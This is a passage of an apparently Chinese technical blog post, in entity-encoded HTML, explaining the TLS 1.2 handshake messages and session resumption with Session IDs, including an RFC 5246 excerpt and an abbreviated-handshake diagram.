&#xFF0C;&#x5BA2;&#x6237;&#x7AEF;&#x968F;&#x540E;&#x4F7F;&#x7528;&#x670D;&#x52A1;&#x5668;&#x7684;&#x516C;&#x5171;&#x5BC6;&#x94A5;&#x5BF9;&#x8BE5;&#x5BC6;&#x94A5;&#x4FE1;&#x606F;&#x8FDB;&#x884C;&#x52A0;&#x5BC6;&#x5E76;&#x5C06;&#x5176;&#x53D1;&#x9001;&#x5230;&#x670D;&#x52A1;&#x5668;&#x3002; &#x5BF9;&#x4E8E;&#x57FA;&#x4E8E; DH &#x7684;&#x5BC6;&#x7801;&#x5957;&#x4EF6;&#xFF0C;&#x6B64;&#x6D88;&#x606F;&#x5305;&#x542B;&#x5BA2;&#x6237;&#x7AEF;&#x7684; DH &#x516C;&#x94A5;&#x3002;</p></li><li><p>(Optional) <strong>Certificate verify:</strong> &#x5982;&#x524D;&#x6240;&#x8FF0;&#xFF0C;&#x5F53;&#x5BA2;&#x6237;&#x7AEF;&#x51FA;&#x793A;&#x8BC1;&#x4E66;&#x65F6;&#xFF0C;&#x6B64;&#x6D88;&#x606F;&#x7531;&#x5BA2;&#x6237;&#x7AEF;&#x53D1;&#x9001;&#x3002; &#x5176;&#x76EE;&#x7684;&#x662F;&#x5141;&#x8BB8;&#x670D;&#x52A1;&#x5668;&#x5B8C;&#x6210;&#x5BF9;&#x5BA2;&#x6237;&#x7AEF;&#x8FDB;&#x884C;&#x8EAB;&#x4EFD;&#x9A8C;&#x8BC1;&#x7684;&#x8FC7;&#x7A0B;&#x3002; &#x4F7F;&#x7528;&#x6B64;&#x6D88;&#x606F;&#x65F6;&#xFF0C;&#x5BA2;&#x6237;&#x7AEF;&#x4F7F;&#x7528;&#x52A0;&#x5BC6;&#x54C8;&#x5E0C;&#x51FD;&#x6570;&#x53D1;&#x9001;&#x5176;&#x8FDB;&#x884C;&#x6570;&#x5B57;&#x7B7E;&#x540D;&#x7684;&#x4FE1;&#x606F;&#x3002; &#x5F53;&#x670D;&#x52A1;&#x5668;&#x4F7F;&#x7528;&#x5BA2;&#x6237;&#x7AEF;&#x7684;&#x516C;&#x5171;&#x5BC6;&#x94A5;&#x89E3;&#x5BC6;&#x6B64;&#x4FE1;&#x606F;&#x65F6;&#xFF0C;&#x670D;&#x52A1;&#x5668;&#x4FBF;&#x80FD;&#x591F;&#x5BF9;&#x5BA2;&#x6237;&#x7AEF;&#x8FDB;&#x884C;&#x8EAB;&#x4EFD;&#x9A8C;&#x8BC1;&#x3002;</p></li><li><p><strong>Change cipher spec:</strong> &#x5BA2;&#x6237;&#x7AEF;&#x53D1;&#x9001;&#x4E00;&#x6761;&#x6D88;&#x606F;&#xFF0C;&#x544A;&#x77E5;&#x670D;&#x52A1;&#x5668;&#x66F4;&#x6539;&#x4E3A;&#x52A0;&#x5BC6;&#x6A21;&#x5F0F;&#x3002;</p></li><li><p><strong>Finished</strong>: &#x5BA2;&#x6237;&#x7AEF;&#x544A;&#x8BC9;&#x670D;&#x52A1;&#x5668;&#x5DF2;&#x51C6;&#x5907;&#x597D;&#x5F00;&#x59CB;&#x5B89;&#x5168;&#x6570;&#x636E;&#x901A;&#x4FE1;&#x3002;</p></li><li><p><strong>Change cipher spec:</strong> &#x670D;&#x52A1;&#x5668;&#x53D1;&#x9001;&#x4E00;&#x6761;&#x6D88;&#x606F;&#xFF0C;&#x544A;&#x77E5;&#x5BA2;&#x6237;&#x7AEF;&#x66F4;&#x6539;&#x4E3A;&#x52A0;&#x5BC6;&#x6A21;&#x5F0F;&#x3002;</p></li><li><p><strong>Finished:</strong> &#x670D;&#x52A1;&#x5668;&#x544A;&#x8BC9;&#x5BA2;&#x6237;&#x7AEF;&#x5B83;&#x5DF2;&#x51C6;&#x5907;&#x597D;&#x5F00;&#x59CB;&#x5B89;&#x5168;&#x6570;&#x636E;&#x901A;&#x4FE1;&#xFF0C;&#x63E1;&#x624B;&#x5230;&#x6B64;&#x7ED3;&#x675F;&#x3002;</p></li><li><p><strong>Encrypted data:</strong> &#x5BA2;&#x6237;&#x7AEF;&#x548C;&#x670D;&#x52A1;&#x5668;&#x4F7F;&#x7528;&#x5BF9;&#x79F0;&#x52A0;&#x5BC6;&#x7B97;&#x6CD5;&#x548C;&#x5728;&#x5BA2;&#x6237;&#x7AEF;&#x95EE;&#x5019;&#x548C;&#x670D;&#x52A1;&#x5668;&#x95EE;&#x5019;&#x671F;&#x95F4;&#x534F;&#x5546;&#x7684;&#x52A0;&#x5BC6;&#x54C8;&#x5E0C;&#x51FD;&#x6570;&#xFF0C;&#x4EE5;&#x53CA;&#x4F7F;&#x7528;&#x5BA2;&#x6237;&#x7AEF;&#x5728;&#x5BA2;&#x6237;&#x7AEF;&#x5BC6;&#x94A5;&#x4EA4;&#x6362;&#x671F;&#x95F4;&#x53D1;&#x9001;&#x7ED9;&#x670D;&#x52A1;&#x5668;&#x7684;&#x79D8;&#x5BC6;&#x5BC6;&#x94A5;&#x8FDB;&#x884C;&#x901A;&#x4FE1;&#x3002; &#x6B64;&#x65F6;&#x53EF;&#x4EE5;&#x91CD;&#x65B0;&#x534F;&#x5546;&#x63E1;&#x624B;&#x3002;</p></li><li><p><strong>Close Messages:</strong> &#x5728;&#x8FDE;&#x63A5;&#x7ED3;&#x675F;&#x65F6;&#xFF0C;&#x53CC;&#x65B9;&#x90FD;&#x4F1A;&#x53D1;&#x9001; close_notify Alert &#x62A5;&#x6587;&#xFF0C;&#x4EE5;&#x901A;&#x77E5;&#x5BF9;&#x7B49;&#x65B9;&#x8BE5;&#x8FDE;&#x63A5;&#x5DF2;&#x5173;&#x95ED;&#x3002;</p></li></ol><p>&#x5927;&#x81F4;&#x6D41;&#x7A0B;&#x5982;&#x4E0B;&#x56FE;&#x6240;&#x793A;</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/images/tls-poison/Part1-1/1.png" alt></p><p>&#x5BF9;&#x4E8E;&#x4E0D;&#x540C;&#x7684;&#x5BC6;&#x94A5;&#x7B97;&#x6CD5;&#x53C8;&#x4F1A;&#x4EA7;&#x751F;&#x7A0D;&#x5FAE;&#x4E0D;&#x4E00;&#x81F4;&#x7684;&#x6D41;&#x7A0B;&#xFF0C;&#x8FD9;&#x91CC;&#x5E76;&#x4E0D;&#x4F5C;&#x4E3A;&#x91CD;&#x70B9;&#xFF0C;&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x5C31;&#x4E0D;&#x518D;&#x5C55;&#x5F00;&#x63CF;&#x8FF0;&#x4E86;&#x3002;</p><h4 id="TLS-1-2-Session-Resumption-Overview"><a href="#TLS-1-2-Session-Resumption-Overview" class="headerlink" title="TLS 1.2 Session Resumption Overview"></a>TLS 1.2 Session Resumption Overview</h4><p>&#x5B8C;&#x6574;&#x7684; TLS &#x63E1;&#x624B;&#x4EA7;&#x751F;&#x7684;&#x989D;&#x5916;&#x5EF6;&#x65F6;&#x548C;&#x8BA1;&#x7B97;&#x6210;&#x672C;&#x5BF9;&#x6240;&#x6709;&#x9700;&#x8981;&#x5B89;&#x5168;&#x901A;&#x4FE1;&#x7684;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x727A;&#x7272;&#x4E86;&#x5F88;&#x591A;&#x6027;&#x80FD;&#x4EE3;&#x4EF7;&#xFF0C;&#x4E3A;&#x4E86;&#x5E2E;&#x52A9;&#x964D;&#x4F4E;&#x90E8;&#x5206;&#x6210;&#x672C;&#xFF0C; TLS &#x63D0;&#x4F9B;&#x4E86;&#x4E00;&#x79CD;&#x673A;&#x5236;&#x6062;&#x590D;&#x4F1A;&#x8BDD;&#x673A;&#x5236;&#xFF0C;&#x7528;&#x6765;&#x6062;&#x590D;&#x6216;&#x5171;&#x4EAB;&#x591A;&#x4E2A;&#x8FDE;&#x63A5;&#x4E4B;&#x95F4;&#x7684;&#x76F8;&#x540C;&#x534F;&#x5546;&#x7684;&#x79D8;&#x94A5;&#x6570;&#x636E;&#x3002;&#x4F1A;&#x8BDD;&#x6062;&#x590D;&#x662F;&#x4E00;&#x4E2A;&#x91CD;&#x8981;&#x7684;&#x4F18;&#x5316;&#x90E8;&#x7F72;&#xFF0C;&#x7B80;&#x7565;&#x7684;&#x63E1;&#x624B;&#x6D88;&#x9664;&#x4E86;&#x4E00;&#x4E2A;&#x5B8C;&#x6574;&#x7684; TLS &#x63E1;&#x624B;&#x5F80;&#x8FD4;&#x8017;&#x65F6;&#xFF0C;&#x5927;&#x5927;&#x964D;&#x4F4E;&#x4E86;&#x53CC;&#x65B9;&#x7684;&#x8BA1;&#x7B97;&#x6210;&#x672C;&#x3002;&#x5728; TLS 1.2 &#x4E2D;&#xFF0C; TLS Session Resumption &#x53EF;&#x4EE5;&#x91C7;&#x7528; Session ID &#x548C;&#x4F1A;&#x8BDD;&#x7968;&#x673A;&#x5236;&#x6765;&#x5B9E;&#x73B0;&#x3002;&#x9664;&#x4E86;&#x6027;&#x80FD;&#x4E0A;&#x7684;&#x4F18;&#x52BF;&#x5916;&#xFF0C;&#x6062;&#x590D;&#x7684;&#x4F1A;&#x8BDD;&#x8FD8;&#x53EF;&#x4EE5;&#x7528;&#x4E8E;&#x5355;&#x70B9;&#x767B;&#x5F55;&#xFF0C;&#x56E0;&#x4E3A;&#x5B83;&#x4FDD;&#x8BC1;&#x4E86;&#x539F;&#x59CB;&#x4F1A;&#x8BDD;&#x548C;&#x4EFB;&#x4F55;&#x6062;&#x590D;&#x7684;&#x4F1A;&#x8BDD;&#x90FD;&#x6765;&#x81EA;&#x540C;&#x4E00;&#x4E2A;&#x5BA2;&#x6237;&#x7AEF;&#x3002;</p><h4 id="TLS-1-2-Session-Resumption-Session-ID"><a href="#TLS-1-2-Session-Resumption-Session-ID" class="headerlink" title="TLS 1.2 Session Resumption - Session ID"></a>TLS 1.2 Session Resumption - Session ID</h4><p>&#x5728;&#x8FD9;&#x79CD;&#x673A;&#x5236;&#x4E2D;&#xFF0C;&#x670D;&#x52A1;&#x5668;&#x5728;&#x4E0E;&#x5BA2;&#x6237;&#x7AEF;&#x521D;&#x6B21;&#x63E1;&#x624B;&#x65F6;&#xFF0C;&#x670D;&#x52A1;&#x5668;&#x4F1A;&#x968F;&#x673A;&#x5206;&#x914D;&#x4E00;&#x4E2A; Session ID&#x3002;&#x5BA2;&#x6237;&#x7AEF;&#x548C;&#x670D;&#x52A1;&#x5668;&#x5C06;&#x8FD9;&#x4E2A;&#x4F1A;&#x8BDD;ID&#x4E0E;&#x4F1A;&#x8BDD;&#x5BC6;&#x94A5;&#x548C;&#x8FDE;&#x63A5;&#x72B6;&#x6001;&#x4E00;&#x8D77;&#x5B58;&#x50A8;&#x3002;&#x4E3A;&#x4E86;&#x6062;&#x590D;&#x4F1A;&#x8BDD;&#xFF0C;&#x5BA2;&#x6237;&#x7AEF;&#x5C06;&#x5B58;&#x50A8;&#x7684;&#x4F1A;&#x8BDD;ID&#x4E0E;&#x7B2C;&#x4E00;&#x4E2A;&#x534F;&#x8BAE;&#x6D88;&#x606F;&#xFF08;ClientHello&#xFF09;&#x4E00;&#x8D77;&#x53D1;&#x9001;&#x7ED9;&#x670D;&#x52A1;&#x5668;&#x3002;&#x5982;&#x679C;&#x670D;&#x52A1;&#x5668;&#x8BC6;&#x522B;&#x5230;&#x4E86;&#x8FDE;&#x63A5;&#x5E76;&#x613F;&#x610F;&#x6062;&#x590D;&#x4F1A;&#x8BDD;&#xFF0C;&#x5B83;&#x5C31;&#x4F1A;&#x7528;&#x76F8;&#x540C;&#x7684;&#x4F1A;&#x8BDD;ID&#x6765;&#x56DE;&#x590D;&#xFF0C;&#x91CD;&#x65B0;&#x5EFA;&#x7ACB;&#x5404;&#x81EA;&#x7684;&#x4F1A;&#x8BDD;&#x3002;&#x8FD9;&#x6837;&#x5C31;&#x53EF;&#x4EE5;&#x5FEB;&#x901F;&#x5EFA;&#x7ACB;&#x5B89;&#x5168;&#x7684;&#x8FDE;&#x63A5;&#xFF0C;&#x800C;&#x4E14;&#x7531;&#x4E8E;&#x6211;&#x4EEC;&#x91CD;&#x7528;&#x4E86;&#x4E4B;&#x524D;&#x534F;&#x5546;&#x597D;&#x7684;&#x4F1A;&#x8BDD;&#x6570;&#x636E;&#xFF0C;&#x6240;&#x4EE5;&#x4E0D;&#x4F1A;&#x635F;&#x5931;&#x5B89;&#x5168;&#x6027;&#x3002;</p><p>Client &#x5728;&#x4E00;&#x5F00;&#x59CB;&#x53D1;&#x9001; ClientHello &#x6D88;&#x606F;&#x4E2D;&#xFF0C; ClientHello &#x6D88;&#x606F;&#x4E2D;&#x5305;&#x62EC;&#x4E00;&#x4E2A;&#x53EF;&#x53D8;&#x957F;&#x5EA6;&#x7684; Session ID&#x3002;&#x5982;&#x679C;&#x4E3A;&#x7A7A;&#x5219;&#x8868;&#x793A;&#x662F;&#x4E00;&#x4E2A;&#x65B0;&#x7684;&#x4F1A;&#x8BDD;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x5BA2;&#x6237;&#x7AEF;&#x4E0E;&#x670D;&#x52A1;&#x7AEF;&#x7B2C;&#x4E00;&#x6B21;&#x63E1;&#x624B;&#xFF0C;Server &#x5728;&#x8FD4;&#x56DE; ServerHello &#x65F6;&#x5C31;&#x4F1A;&#x53D1;&#x9001;&#x4E00;&#x4E2A; Session ID &#xFF0C;&#x6B64;&#x65F6;&#x5185;&#x5BB9;&#x4E3A; Server &#x4EA7;&#x751F;&#xFF0C;&#x5F53;&#x534F;&#x5546;&#x63E1;&#x624B;&#x5B8C;&#x6210;&#x540E;&#xFF0C;Session ID &#x5C31;&#x53D8;&#x5F97;&#x6709;&#x6548;&#xFF0C;&#x5E76;&#x4E00;&#x76F4;&#x5B58;&#x5728;&#xFF0C;&#x76F4;&#x5230;&#x7531;&#x4E8E;&#x8D85;&#x8FC7;&#x6709;&#x6548;&#x65F6;&#x95F4;&#x6216;&#x56E0;&#x4E3A;&#x5728;&#x4E0E;&#x4F1A;&#x8BDD;&#x76F8;&#x5173;&#x7684;&#x8FDE;&#x63A5;&#x4E0A;&#x9047;&#x5230;&#x670D;&#x52A1;&#x5668;&#x9519;&#x8BEF;&#x800C;&#x88AB;&#x5220;&#x9664;&#x3002;&#x5982;&#x679C;&#x4E0D;&#x4E3A;&#x7A7A;&#xFF0C;&#x8BE5;&#x503C;&#x5C31;&#x8868;&#x793A;&#x5BA2;&#x6237;&#x7AEF;&#x5E0C;&#x671B;&#x91CD;&#x7528;&#x8BE5;&#x4F1A;&#x8BDD;&#x7684;&#x5B89;&#x5168;&#x53C2;&#x6570;&#xFF0C;Server &#x4F1A;&#x68C0;&#x67E5;&#x5B83;&#x7684;&#x4F1A;&#x8BDD;&#x7F13;&#x5B58;&#x4EE5;&#x8FDB;&#x884C;&#x5339;&#x914D;&#xFF0C;&#x5982;&#x679C;&#x5339;&#x914D;&#x6210;&#x529F;&#xFF0C;&#x5E76;&#x4E14; Server &#x613F;&#x610F;&#x5728;&#x6307;&#x5B9A;&#x7684;&#x4F1A;&#x8BDD;&#x72B6;&#x6001;&#x4E0B;&#x91CD;&#x5EFA;&#x8FDE;&#x63A5;&#xFF0C;&#x5B83;&#x5C06;&#x4F1A;&#x53D1;&#x9001;&#x4E00;&#x4E2A;&#x5E26;&#x6709;&#x76F8;&#x540C;&#x4F1A;&#x8BDD; ID &#x503C;&#x7684; ServerHello &#x6D88;&#x606F;&#xFF0C;&#x8FD9;&#x65F6; Client &#x548C; Server &#x5FC5;&#x987B;&#x90FD;&#x53D1;&#x9001; ChangeCipherSpec &#x6D88;&#x606F;&#x5E76;&#x4E14;&#x76F4;&#x63A5;&#x53D1;&#x9001; Finished &#x6D88;&#x606F;&#xFF0C;&#x4E00;&#x65E6;&#x91CD;&#x5EFA;&#x7ACB;&#x5B8C;&#x6210;&#xFF0C;Client &#x548C; Server &#x53EF;&#x4EE5;&#x5F00;&#x59CB;&#x4EA4;&#x6362;&#x5E94;&#x7528;&#x5C42;&#x6570;&#x636E;&#x3002;&#x5982;&#x679C;&#x4E00;&#x4E2A;&#x4F1A;&#x8BDD; ID &#x4E0D;&#x5339;&#x914D;&#xFF0C;Server &#x4F1A;&#x4EA7;&#x751F;&#x4E00;&#x4E2A;&#x65B0;&#x7684;&#x4F1A;&#x8BDD; ID&#xFF0C;&#x7136;&#x540E; TLS Client &#x548C; Server &#x9700;&#x8981;&#x8FDB;&#x884C;&#x4E00;&#x6B21;&#x5B8C;&#x6574;&#x7684;&#x63E1;&#x624B;&#x3002;</p><p></p><figure class="highlight routeros hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Client                                                Server</span><br><span class="line"></span><br><span class="line">ClientHello                   --------&gt;</span><br><span class="line">                                                 ServerHello</span><br><span class="line">                                          [ChangeCipherSpec]</span><br><span class="line">                              &lt;--------             Finished</span><br><span class="line">[ChangeCipherSpec]</span><br><span class="line">Finished                      --------&gt;</span><br><span class="line">Application Data              &lt;-------&gt;     Application Data</span><br><span class="line"></span><br><span class="line">    Figure 2.  Message flow <span class="hljs-keyword">for</span> an abbreviated handshake</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x5728; RFC 5246 &#x4E2D;&#xFF0C;&#x5BF9; SessionID &#x505A;&#x51FA;&#x4E86;&#x89C4;&#x5B9A;&#xFF0C;&#x5176;&#x957F;&#x5EA6;&#x4E3A; 0-32 &#x4F4D;&#xFF1A;</p><p></p><figure class="highlight angelscript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">opaque SessionID&lt;<span class="hljs-number">0.</span><span class="hljs-number">.32</span>&gt;;</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x540C;&#x65F6; RFC &#x5EFA;&#x8BAE; Session ID&#x7684;&#x5BFF;&#x547D;&#x4E0A;&#x9650;&#x4E3A;24&#x5C0F;&#x65F6;&#xFF0C;&#x56E0;&#x4E3A;&#x83B7;&#x5F97;<code>master_secret</code>&#x7684;&#x653B;&#x51FB;&#x8005;&#x53EF;&#x80FD;&#x4F1A;&#x5192;&#x5145;&#x88AB;&#x5165;&#x4FB5;&#x7684;&#x4E00;&#x65B9;&#xFF0C;&#x76F4;&#x5230;&#x76F8;&#x5E94;&#x7684; Session ID &#x5931;&#x6548;&#x3002;</p><p>&#x6574;&#x4E2A;&#x91CD;&#x7528;&#x8FC7;&#x7A0B;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x4ECE;&#x4E0B;&#x56FE;&#x6BD4;&#x8F83;&#x76F4;&#x89C2;&#x7684;&#x770B;&#x5230;&#xFF1A;</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/images/tls-poison/Part1-1/2.jpeg" alt></p><p>&#x5BA2;&#x6237;&#x7AEF;&#x9996;&#x5148;&#x53D1;&#x9001;&#x4E86;&#x4E00;&#x4E2A; Client Hello &#x6D88;&#x606F;&#x7ED9;&#x670D;&#x52A1;&#x7AEF;&#xFF0C;&#x5E76;&#x4E14;&#x5176; Session ID &#x4E3A;&#x7A7A;&#xFF0C;&#x8FD9;&#x65F6;&#x5019; Server &#x54CD;&#x5E94;&#x4E86; Server Hello &#x5F53;&#x4E2D;&#x5C31;&#x4F1A;&#x8FD4;&#x56DE;&#x4E00;&#x4E2A; 32 &#x5B57;&#x8282;&#x957F;&#x5EA6;&#x7684; Session ID&#x3002;&#x73B0;&#x5728;&#x5BA2;&#x6237;&#x7AEF;&#x548C;&#x670D;&#x52A1;&#x5668;&#x7684; TLS &#x4F1A;&#x8BDD;&#x7F13;&#x5B58;&#x4E2D;&#x90FD;&#x5B58;&#x50A8;&#x4E86; Session ID&#xFF0C;&#x5176;&#x503C;&#x4E3A; 56bcf9f6ea40ac1bbf05ff7fd209d423da9f96404103226c7f927ad7a2992433&#x3002;&#x8FD9;&#x6837;&#x505A;&#x7684;&#x597D;&#x5904;&#x5C31;&#x662F;&#xFF0C;&#x5728;&#x4E0B;&#x4E00;&#x6B21;TLS&#x8FDE;&#x63A5;&#x8BF7;&#x6C42;&#x4E2D;&#xFF0C;&#x5BA2;&#x6237;&#x7AEF;&#x4E0D;&#x9700;&#x8981;&#x518D;&#x7ECF;&#x5386;&#x5B8C;&#x6574;&#x7684;TLS&#x63E1;&#x624B;&#x3002;</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQU